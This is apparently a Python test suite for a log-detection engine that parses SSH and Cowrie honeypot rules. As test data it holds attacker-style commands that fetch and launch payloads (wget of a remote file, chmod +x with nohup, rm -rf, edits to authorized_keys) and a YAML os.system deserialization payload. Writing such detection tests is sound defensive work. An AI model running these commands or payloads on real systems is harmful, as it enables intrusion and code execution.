import os
import tempfile
import unittest
from datetime import datetime, timedelta, timezone

from siftlog.engine import (
    EVENT_COUNT,
    IMPOSSIBLE_TRAVEL,
    TEMPORAL_ORDERED,
    VALUE_COUNT,
    Condition,
    RuleError,
    load_rules,
    parse_rule,
)
from siftlog.events import Event

RULES_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "rules")


def base(**overrides):
    rule = {
        "id": "r1",
        "title": "A rule",
        "type": "event_count",
        "filter": {"event_type": "auth_failure"},
        "group_by": ["src_ip"],
        "timespan": "5m",
        "condition": {"gte": 10},
    }
    rule.update(overrides)
    return rule


def without(key):
    rule = base()
    del rule[key]
    return rule


class ParseTests(unittest.TestCase):
    def test_minimal_rule_and_defaults(self):
        rule = parse_rule(base())
        self.assertEqual((rule.id, rule.type, rule.group_by, rule.threshold, rule.op), ("r1", EVENT_COUNT, ("src_ip",), 10, "gte"))
        self.assertEqual(rule.timespan, timedelta(minutes=5))
        self.assertEqual(rule.effective_cooldown, rule.timespan)  # cooldown defaults to the timespan
        self.assertEqual((rule.severity, rule.mitre, rule.distinct), ("medium", (), None))
        self.assertEqual(rule.filter, {"event_type": ("auth_failure",)})

    def test_timespan_units_and_explicit_cooldown(self):
        for text, seconds in (("30s", 30), ("5m", 300), ("2h", 7200), ("1d", 86400)):
            self.assertEqual(parse_rule(base(timespan=text)).timespan, timedelta(seconds=seconds))
        self.assertEqual(parse_rule(base(cooldown="1h")).effective_cooldown, timedelta(hours=1))

    def test_filter_accepts_a_list_and_group_by_a_single_name(self):
        rule = parse_rule(base(filter={"event_type": ["auth_failure", "invalid_user"]}, group_by="username"))
        self.assertEqual(rule.filter["event_type"], ("auth_failure", "invalid_user"))
        self.assertEqual(rule.group_by, ("username",))

    def test_value_count_needs_distinct(self):
        rule = parse_rule(base(type="value_count", distinct="username"))
        self.assertEqual((rule.type, rule.distinct), (VALUE_COUNT, "username"))

    def test_sigma_spellings_are_accepted(self):
        data = without("group_by")
        data.update({"group-by": ["src_ip"], "type": "value_count", "condition": {"field": "username", "gte": 8}})
        rule = parse_rule(data)
        self.assertEqual((rule.group_by, rule.distinct, rule.threshold), (("src_ip",), "username", 8))

    def test_gt_operator(self):
        rule = parse_rule(base(condition={"gt": 10}))
        self.assertEqual((rule.holds(10), rule.holds(11)), (False, True))
        self.assertTrue(parse_rule(base()).holds(10))

    def test_malformed_rules_are_rejected_with_a_reason(self):
        cases = {
            "not a mapping": ["just", "a", "list"],
            "unknown key": base(treshold=10),  # the typo strict validation exists to catch
            "missing required key": without("condition"),
            "bad type": base(type="threshold"),
            "bad timespan": base(timespan="five minutes"),
            "zero timespan": base(timespan="0m"),
            "numeric timespan": base(timespan=300),
            "unknown filter field": base(filter={"password": "x"}),
            "unknown group field": base(group_by=["ip"]),
            "empty group_by": base(group_by=[]),
            "no operator": base(condition={}),
            "two operators": base(condition={"gte": 5, "gt": 5}),
            "zero threshold": base(condition={"gte": 0}),
            "boolean threshold": base(condition={"gte": True}),
            "string threshold": base(condition={"gte": "10"}),
            "value_count without distinct": base(type="value_count"),
            "distinct on event_count": base(distinct="username"),
            "bad severity": base(severity="urgent"),
            "mitre not a list": base(mitre="T1110"),
            "empty id": base(id=" "),
            "both group spellings": dict(base(), **{"group-by": ["src_ip"]}),
            "disagreeing distinct": base(type="value_count", distinct="username",
                                         condition={"field": "src_ip", "gte": 3}),
        }
        for name, data in cases.items():
            with self.subTest(name), self.assertRaises(RuleError):
                parse_rule(data, origin="test.yml")

    def test_error_names_the_file_and_rule(self):
        with self.assertRaises(RuleError) as caught:
            parse_rule(base(timespan="soon"), origin="rules/x.yml")
        self.assertIn("rules/x.yml", str(caught.exception))
        self.assertIn("r1", str(caught.exception))


def sequence(**overrides):
    rule = {
        "id": "seq", "title": "A sequence", "type": "temporal_ordered",
        "group_by": ["src_ip"], "timespan": "10m",
        "steps": [{"filter": {"event_type": "auth_failure"}, "condition": {"gte": 5}},
                  {"filter": {"event_type": "auth_success"}}],
    }  # fmt: skip
    rule.update(overrides)
    return rule


def travel(**overrides):
    rule = {
        "id": "trv", "title": "Travel", "type": "impossible_travel",
        "group_by": ["username"], "timespan": "24h", "max_speed_kmh": 900,
    }  # fmt: skip
    rule.update(overrides)
    return rule


def command(text, **overrides):
    """A honeypot command event. ``text`` is what the visitor typed."""
    fields = dict(
        id="e1", timestamp=datetime(2026, 10, 12, 10, 0, tzinfo=timezone.utc), source="cowrie", event_type="command",
        src_ip="198.51.100.7", username=None, host="honeypot01", outcome=None, raw="{}",
        extra={"input": text, "session": "0a1b2c3d4e5f", "dst_port": 2222},
    )  # fmt: skip
    fields.update(overrides)
    return Event(**fields)


class TextMatchTests(unittest.TestCase):
    """Filters that look inside text, and at source-specific detail (stage 9)."""

    def rule(self, **overrides):
        overrides.setdefault("filter", {"event_type": "command"})
        overrides.setdefault("condition", {"gte": 1})
        return parse_rule(base(**overrides))

    def test_text_tests_are_kept_apart_from_plain_equality(self):
        rule = self.rule(filter={"event_type": "command", "extra.input|contains": ["wget", "CURL "]})
        self.assertEqual(rule.filter, {"event_type": ("command",)})  # unchanged: still a dictionary lookup
        self.assertEqual(rule.where, (Condition("extra.input", "contains", ("wget", "curl "), False),))
        self.assertEqual(self.rule().where, ())
        self.assertEqual(self.rule().exclude, ())

    def test_contains_matches_any_value_and_ignores_case(self):
        rule = self.rule(filter={"extra.input|contains": ["wget ", "curl "]})
        self.assertTrue(rule.matches(command("cd /tmp; wget http://203.0.113.200/x")))
        self.assertTrue(rule.matches(command("CURL -s http://203.0.113.200/x")))
        self.assertFalse(rule.matches(command("uname -a")))
        self.assertFalse(rule.matches(command("wget")))  # the rule asked for "wget " with a space

    def test_all_requires_every_value(self):
        rule = self.rule(filter={"extra.input|contains|all": ["chmod +x", "nohup"]})
        self.assertTrue(rule.matches(command("chmod +x ./a; nohup ./a &")))
        self.assertFalse(rule.matches(command("chmod +x ./a")))
        self.assertFalse(rule.matches(command("nohup ./a &")))

    def test_startswith_and_endswith(self):
        starts = self.rule(filter={"extra.input|startswith": "cd /tmp"})
        self.assertTrue(starts.matches(command("CD /TMP && ls")))
        self.assertFalse(starts.matches(command("ls; cd /tmp")))
        ends = self.rule(filter={"extra.destfile|endswith": "/.ssh/authorized_keys"})
        self.assertTrue(ends.matches(command("x", extra={"destfile": "/root/.ssh/authorized_keys"})))
        self.assertFalse(ends.matches(command("x", extra={"destfile": "/root/.ssh/authorized_keys.bak"})))

    def test_text_tests_work_on_event_fields_too(self):
        rule = self.rule(filter={"username|startswith": "svc-", "source": "cowrie"})
        self.assertEqual(rule.filter, {"source": ("cowrie",)})
        self.assertTrue(rule.matches(command("x", username="SVC-backup")))
        self.assertFalse(rule.matches(command("x", username="root")))
        self.assertFalse(rule.matches(command("x", username=None)))  # no username: nothing to test

    def test_plain_equality_on_an_extra_field_is_exact(self):
        rule = self.rule(filter={"extra.input": ["uname -a", "id"]})
        self.assertEqual(rule.where, (Condition("extra.input", "equals", ("uname -a", "id"), False),))
        self.assertTrue(rule.matches(command("uname -a")))
        self.assertFalse(rule.matches(command("UNAME -A")))  # equality does not ignore case
        self.assertFalse(rule.matches(command("uname -a; wget http://203.0.113.200/x")))
        self.assertFalse(rule.matches(command(" uname -a")))

    def test_a_number_in_the_log_equals_the_same_number_in_the_rule(self):
        rule = self.rule(filter={"extra.dst_port": 2222})
        self.assertTrue(rule.matches(command("x")))
        self.assertFalse(self.rule(filter={"extra.dst_port": 22}).matches(command("x")))
        self.assertFalse(self.rule(filter={"extra.flag": "True"}).matches(command("x", extra={"flag": True})))

    def test_a_missing_or_non_text_field_never_matches(self):
        for extra in ({}, {"input": None}, {"input": 7}, {"input": ["wget x"]}, {"input": {"a": "wget x"}}):
            with self.subTest(extra=extra):
                event = command("ignored", extra=extra)
                self.assertFalse(self.rule(filter={"extra.input|contains": "wget"}).matches(event))
                self.assertFalse(self.rule(filter={"extra.input": "wget x"}).matches(event))

    def test_every_line_of_a_filter_must_hold(self):
        rule = self.rule(filter={"event_type": "command", "extra.input|contains": "wget", "extra.input|endswith": ".sh"})
        self.assertEqual(len(rule.where), 2)
        self.assertTrue(rule.matches(command("wget http://203.0.113.200/a.sh")))
        self.assertFalse(rule.matches(command("wget http://203.0.113.200/a.bin")))
        self.assertFalse(rule.matches(command("wget http://203.0.113.200/a.sh", event_type="auth_success")))

    def test_exclude_removes_events_that_match_a_whole_block(self):
        rule = self.rule(exclude={"extra.input": ["uname -a", "id"]})
        self.assertEqual(rule.exclude, ((Condition("extra.input", "equals", ("uname -a", "id"), False),),))
        self.assertFalse(rule.matches(command("uname -a")))
        self.assertFalse(rule.matches(command("id")))
        self.assertTrue(rule.matches(command("uname -a; id")))

        both = self.rule(exclude={"extra.input|startswith": "echo ", "username": "monitor"})
        self.assertFalse(both.matches(command("echo ok", username="monitor")))
        self.assertTrue(both.matches(command("echo ok", username="root")))  # only one line of the block holds
        self.assertTrue(both.matches(command("ls", username="monitor")))

    def test_exclude_takes_a_list_of_blocks_and_any_one_is_enough(self):
        rule = self.rule(exclude=[{"extra.input": "uname -a"}, {"src_ip": "198.51.100.99"}])
        self.assertEqual(len(rule.exclude), 2)
        self.assertFalse(rule.matches(command("uname -a")))
        self.assertFalse(rule.matches(command("ls", src_ip="198.51.100.99")))
        self.assertTrue(rule.matches(command("ls")))

    def test_steps_can_use_text_tests(self):
        steps = [{"filter": {"event_type": "auth_success"}},
                 {"filter": {"event_type": "command", "extra.input|contains": "authorized_keys"}}]  # fmt: skip
        rule = parse_rule(sequence(steps=steps, exclude={"username": "backup"}))
        self.assertEqual(rule.steps[1].where, (Condition("extra.input", "contains", ("authorized_keys",), False),))
        self.assertTrue(rule.steps[1].matches(command("cat .ssh/authorized_keys")))
        self.assertFalse(rule.steps[1].matches(command("ls")))
        self.assertFalse(rule.steps[0].matches(command("cat .ssh/authorized_keys")))
        only_text = [steps[0], {"filter": {"extra.input|contains": "x"}}]
        self.assertEqual(parse_rule(sequence(steps=only_text)).steps[1].filter, {})  # a step may be text tests alone

    def test_hostile_text_is_only_ever_compared(self):
        # The command is whatever an attacker typed. It must not be able to act as a pattern.
        rule = self.rule(filter={"extra.input|contains": "a.c"})
        self.assertFalse(rule.matches(command("abc")))  # "." is a dot, not "any character"
        self.assertTrue(rule.matches(command("x a.c y")))
        star = self.rule(filter={"extra.input|contains": ".*"})
        self.assertFalse(star.matches(command("anything at all")))
        self.assertTrue(star.matches(command("rm -rf .*")))
        long = "a" * 4096 + "!"
        self.assertFalse(self.rule(filter={"extra.input|endswith": "a"}).matches(command(long)))

    def test_malformed_text_tests_are_rejected_with_a_reason(self):
        cases = [
            ({"extra.input|matches": "x"}, "unknown modifier"),
            ({"extra.input|re": "x.*"}, "unknown modifier"),  # no regular expressions, on purpose
            ({"extra.input|all": ["a", "b"]}, "unknown modifier"),  # |all needs a text test before it
            ({"extra.input|all|contains": ["a", "b"]}, "unknown modifier"),
            ({"extra.input|contains|startswith": "a"}, "unknown modifier"),
            ({"extra.input|": "a"}, "unknown modifier"),
            ({"extra.input|contains": ""}, "non-empty text"),  # "" is inside everything
            ({"extra.input|contains": ["wget", ""]}, "non-empty text"),
            ({"extra.input|contains": True}, "non-empty text"),
            ({"extra.input|contains": []}, "non-empty list"),
            ({"extra.input|contains": {"a": 1}}, "non-empty list"),
            ({"extra.input|contains": None}, "non-empty list"),
            ({"extras.input": "x"}, "unknown field 'extras.input'"),
            ({"extra.": "x"}, "unknown field"),
            ({"extra.in-put": "x"}, "unknown field"),
            ({"extra.a.b": "x"}, "unknown field"),
            ({"|contains": "x"}, "unknown field ''"),
            ({"input|contains": "x"}, "extra.<name>"),  # the message says how to reach source-specific fields
            ({7: "x"}, "unknown field"),
        ]
        for bad, reason in cases:
            with self.subTest(filter=bad), self.assertRaisesRegex(RuleError, reason):
                self.rule(filter=bad)
            with self.subTest(exclude=bad), self.assertRaisesRegex(RuleError, reason):
                self.rule(exclude=bad)

    def test_malformed_exclude_is_rejected(self):
        for bad, reason in (({}, "must not be empty"), ([], "exclude must be"), ("uname", "must be a mapping"),
                            ([{"extra.input": "a"}, {}], r"exclude\[2\] must not be empty"),
                            ([{"extra.input": "a"}, "b"], r"exclude\[2\] must be a mapping")):  # fmt: skip
            with self.subTest(exclude=bad), self.assertRaisesRegex(RuleError, reason):
                self.rule(exclude=bad)

    def test_extra_fields_cannot_group_or_be_counted(self):
        with self.assertRaisesRegex(RuleError, "extra fields can be used in filter and exclude only"):
            self.rule(group_by=["extra.session"])
        with self.assertRaisesRegex(RuleError, "extra fields can be used in filter and exclude only"):
            self.rule(type="value_count", distinct="extra.password")

    def test_which_sources_a_rule_reads_is_unaffected_by_text_tests(self):
        rule = self.rule(filter={"source": "cowrie", "extra.input|contains": "wget"}, exclude={"source": "sshd"})
        self.assertEqual((rule.reads("cowrie"), rule.reads("sshd")), (True, False))


class NewRuleTypeTests(unittest.TestCase):
    def test_temporal_ordered_steps(self):
        rule = parse_rule(sequence(filter={"source": "sshd"}))
        self.assertEqual(rule.type, TEMPORAL_ORDERED)
        self.assertEqual([s.threshold for s in rule.steps], [5, 1])  # a step with no condition needs one event
        self.assertEqual(rule.steps[0].filter, {"event_type": ("auth_failure",)})
        self.assertEqual(rule.filter, {"source": ("sshd",)})  # the part shared by every step

    def test_which_sources_a_rule_reads(self):
        anything = parse_rule(base())
        self.assertTrue(anything.reads("sshd") and anything.reads("cowrie"))  # no source named: reads them all
        one = parse_rule(base(filter={"event_type": "auth_failure", "source": "cowrie"}))
        self.assertEqual((one.reads("cowrie"), one.reads("sshd")), (True, False))
        two = parse_rule(base(filter={"source": ["sshd", "cowrie"]}))
        self.assertTrue(two.reads("sshd") and two.reads("cowrie"))
        # A sequence reads a source if any of its steps could be met by it.
        steps = [{"filter": {"event_type": "auth_failure", "source": "cowrie"}}, {"filter": {"event_type": "auth_success"}}]
        self.assertTrue(parse_rule(sequence(steps=steps)).reads("sshd"))
        only = [dict(step, filter=dict(step["filter"], source="cowrie")) for step in steps]
        self.assertEqual((parse_rule(sequence(steps=only)).reads("sshd"), parse_rule(sequence(steps=only)).reads("cowrie")),
                         (False, True))
        self.assertFalse(parse_rule(sequence(filter={"source": "cowrie"})).reads("sshd"))

    def test_impossible_travel_numbers(self):
        rule = parse_rule(travel(min_distance_km=100.5))
        self.assertEqual((rule.type, rule.max_speed_kmh, rule.min_distance_km), (IMPOSSIBLE_TRAVEL, 900.0, 100.5))
        self.assertEqual(parse_rule(travel()).min_distance_km, 0.0)

    def test_malformed_new_rule_types_are_rejected(self):
        step = {"filter": {"event_type": "auth_failure"}}
        cases = {
            "sequence without steps": {k: v for k, v in sequence().items() if k != "steps"},
            "one step": sequence(steps=[step]),
            "steps not a list": sequence(steps={"a": 1}),
            "step without filter": sequence(steps=[step, {"condition": {"gte": 1}}]),
            "step with empty filter": sequence(steps=[step, {"filter": {}}]),
            "step with unknown key": sequence(steps=[step, dict(step, distinct="username")]),
            "step with unknown field": sequence(steps=[step, {"filter": {"password": "x"}}]),
            "step condition gt": sequence(steps=[step, dict(step, condition={"gt": 1})]),
            "step condition field": sequence(steps=[step, dict(step, condition={"gte": 1, "field": "username"})]),
            "step threshold zero": sequence(steps=[step, dict(step, condition={"gte": 0})]),
            "condition on a sequence": sequence(condition={"gte": 5}),
            "distinct on a sequence": sequence(distinct="username"),
            "speed on a sequence": sequence(max_speed_kmh=900),
            "travel without speed": {k: v for k, v in travel().items() if k != "max_speed_kmh"},
            "zero speed": travel(max_speed_kmh=0),
            "negative speed": travel(max_speed_kmh=-5),
            "string speed": travel(max_speed_kmh="fast"),
            "boolean speed": travel(max_speed_kmh=True),
            "negative distance": travel(min_distance_km=-1),
            "condition on travel": travel(condition={"gte": 1}),
            "steps on travel": travel(steps=[step, step]),
            "steps on a count rule": base(steps=[step, step]),
            "speed on a count rule": base(max_speed_kmh=900),
            "distance on a count rule": base(min_distance_km=10),
        }
        for name, data in cases.items():
            with self.subTest(name), self.assertRaises(RuleError):
                parse_rule(data, origin="test.yml")


class LoadTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)

    def write(self, name, text):
        path = os.path.join(self.tmp.name, name)
        with open(path, "w") as fh:
            fh.write(text)
        return path

    RULE = (
        "id: {id}\ntitle: t\ntype: event_count\nfilter: {{event_type: auth_failure}}\n"
        "group_by: [src_ip]\ntimespan: 5m\ncondition: {{gte: 10}}\n"
    )

    def test_shipped_rules_load(self):
        rules = {rule.id: rule for rule in load_rules(RULES_DIR)}
        self.assertEqual(set(rules), {
            "ssh-brute-force", "ssh-password-spray", "ssh-credential-stuffing",
            "ssh-success-after-failures", "ssh-impossible-travel",
            "honeypot-file-transfer", "honeypot-shell-commands", "honeypot-credential-sweep",
            "honeypot-ssh-key-planted", "honeypot-payload-launch",
        })  # fmt: skip
        # Every shipped rule names the source it reads, so sshd rules and honeypot rules never mix.
        self.assertEqual({rule.id.split("-")[0]: rule.filter["source"] for rule in rules.values()},
                         {"ssh": ("sshd",), "honeypot": ("cowrie",)})
        self.assertEqual(sorted(r.id for r in rules.values() if r.reads("cowrie")),
                         ["honeypot-credential-sweep", "honeypot-file-transfer", "honeypot-payload-launch",
                          "honeypot-shell-commands", "honeypot-ssh-key-planted"])  # fmt: skip
        # The ssh rules use none of the stage 9 syntax, so the published results cannot have moved.
        self.assertTrue(all(not (r.where or r.exclude) for r in rules.values() if r.id.startswith("ssh-")))
        self.assertEqual(rules["honeypot-shell-commands"].exclude,
                         ((Condition("extra.input", "equals", ("uname -a", "uname -s -v -n -r -m"), False),),))
        # Only command events carry typed text today. Saying so in the rule keeps it true if that changes.
        for rule_id in ("honeypot-ssh-key-planted", "honeypot-payload-launch", "honeypot-shell-commands"):
            self.assertEqual(rules[rule_id].filter, {"source": ("cowrie",), "event_type": ("command",)}, rule_id)
        self.assertEqual(rules["honeypot-payload-launch"].where,
                         (Condition("extra.input", "contains", ("chmod +x", "nohup "), False),))
        sequence, travel = rules["ssh-success-after-failures"], rules["ssh-impossible-travel"]
        self.assertEqual((sequence.type, sequence.group_by), (TEMPORAL_ORDERED, ("src_ip", "username")))
        self.assertEqual([(s.filter["event_type"], s.threshold) for s in sequence.steps],
                         [(("auth_failure",), 5), (("auth_success",), 1)])
        self.assertEqual((travel.type, travel.group_by, travel.max_speed_kmh, travel.min_distance_km),
                         (IMPOSSIBLE_TRAVEL, ("username",), 900.0, 100.0))
        self.assertEqual(travel.timespan, timedelta(hours=24))
        brute, spray, stuffing = rules["ssh-brute-force"], rules["ssh-password-spray"], rules["ssh-credential-stuffing"]
        self.assertEqual((brute.type, brute.group_by, brute.threshold, brute.timespan),
                         (EVENT_COUNT, ("src_ip",), 10, timedelta(minutes=5)))
        self.assertEqual((spray.type, spray.group_by, spray.distinct), (VALUE_COUNT, ("src_ip",), "username"))
        # Stuffing is grouped by the target and counts sources, the reverse of spraying.
        self.assertEqual((stuffing.group_by, stuffing.distinct), (("host",), "src_ip"))
        for rule in rules.values():
            self.assertTrue(rule.mitre and rule.description)

    def test_directory_is_read_in_name_order_with_both_extensions(self):
        self.write("b.yaml", self.RULE.format(id="second"))
        self.write("a.yml", self.RULE.format(id="first"))
        self.write("notes.txt", "ignored")
        self.assertEqual([r.id for r in load_rules(self.tmp.name)], ["first", "second"])

    def test_several_rules_in_one_file(self):
        path = self.write("multi.yml", self.RULE.format(id="one") + "---\n" + self.RULE.format(id="two"))
        self.assertEqual([r.id for r in load_rules(path)], ["one", "two"])

    def test_duplicate_ids_across_files_are_rejected(self):
        self.write("a.yml", self.RULE.format(id="same"))
        self.write("b.yml", self.RULE.format(id="same"))
        with self.assertRaises(RuleError) as caught:
            load_rules(self.tmp.name)
        self.assertIn("duplicate rule id", str(caught.exception))

    def test_broken_or_empty_input_is_rejected(self):
        with self.assertRaises(RuleError):
            load_rules(self.write("bad.yml", "id: [unclosed\n"))
        with self.assertRaises(RuleError):
            load_rules(self.write("empty.yml", "\n"))
        os.mkdir(os.path.join(self.tmp.name, "none"))
        with self.assertRaises(RuleError):
            load_rules(os.path.join(self.tmp.name, "none"))

    def test_a_rule_file_cannot_construct_python_objects(self):
        marker = os.path.join(self.tmp.name, "pwned")
        payload = f"!!python/object/apply:os.system ['touch {marker}']\n"
        with self.assertRaises(RuleError):
            load_rules(self.write("evil.yml", payload))
        self.assertFalse(os.path.exists(marker))


if __name__ == "__main__":
    unittest.main()
